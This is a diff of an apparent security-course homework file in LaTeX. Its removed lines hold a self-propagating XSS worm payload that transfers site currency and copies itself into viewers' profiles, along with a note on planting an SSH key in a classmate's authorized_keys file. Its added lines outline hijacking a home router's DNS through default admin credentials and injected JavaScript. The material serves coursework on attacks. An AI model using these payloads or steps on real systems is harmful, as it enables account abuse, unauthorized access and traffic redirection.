@@ -47,36 +47,31 @@ See Email
 		possible.
 \end{enumerate}
 
-\section{Abuse of Set-UID File Permissions}
-Given 60 seconds of access to another student's unattended keyboard I would go
-into their "\$HOME/.ssh/authorized\_keys" file and add my own ssh key. This way
-later on I would be able to ssh into their computer without needing their
-password.
-
 \section{Web Security}
-\begin{enumerate}
-	\item
-		The profile for this worm would be the following:
-\begin{verbatim}
-		Totally okay account
-		<a id="pancoins" class="
-		a = new XMLHttpRequest();
-		a.open('POST', 'transfer.php');
-		var b= new FormData();
-		b.append('pancoins',1);
-		b.append('recipient', 'panworm');
-		b.append('submission', 'Send');
-		a.send(b);
-		c = new XMLHttpRequest();
-		c.open('POST', 'index.php');
-		var d= new FormData();
-		d.append('profile_update',
-		document.getElementById('pancoins').outerHTML
-		);
-		d.append('profile_submit', 'Update');
-		c.send(d);
-		alert('thanks for all the fish')">
-\end{verbatim}
-\end{enumerate}
+See attached files for answers to A, D, E
 
+\section{Wifi Router Vulnerabilities}
+\begin{enumerate}[A]
+	\item
+		For this attack as an attacker I would first use db-ip.com to find all
+		possible Canadian addresses if I knew about this vulnerability with
+		Bell. Or if the screenshot is from his router then I would know that I
+		can go on 76.65.189.43. 
+		Then I would use netcat to figure out which ports are open and see
+		which of them allow me to login with the authenticate
+		request(http://192.168.2.1/login?u=admin&p=admin). The ones that do I
+		would then send a new DNS server. With my new DNS server I would have
+		the google ip redirect to my kim.dot.com.
+	\item
+		Sitting outside of the professor's condo the attacker would be able to
+		send TCP packets to the router with a different source address. And
+		because the attacker would be right next to the router their address
+		would remain unchanged. Now the attacker can send the same requests as
+		before and modify the DNS 
+	\item
+		A hacker could very easily inject some malicious javascript into
+		youvyou.com that would authenticate with the administrative account. And
+		then aftewards modify the DNS server yet again to set google to be
+		kim.dot.com
+\end{enumerate}
 \end{document}
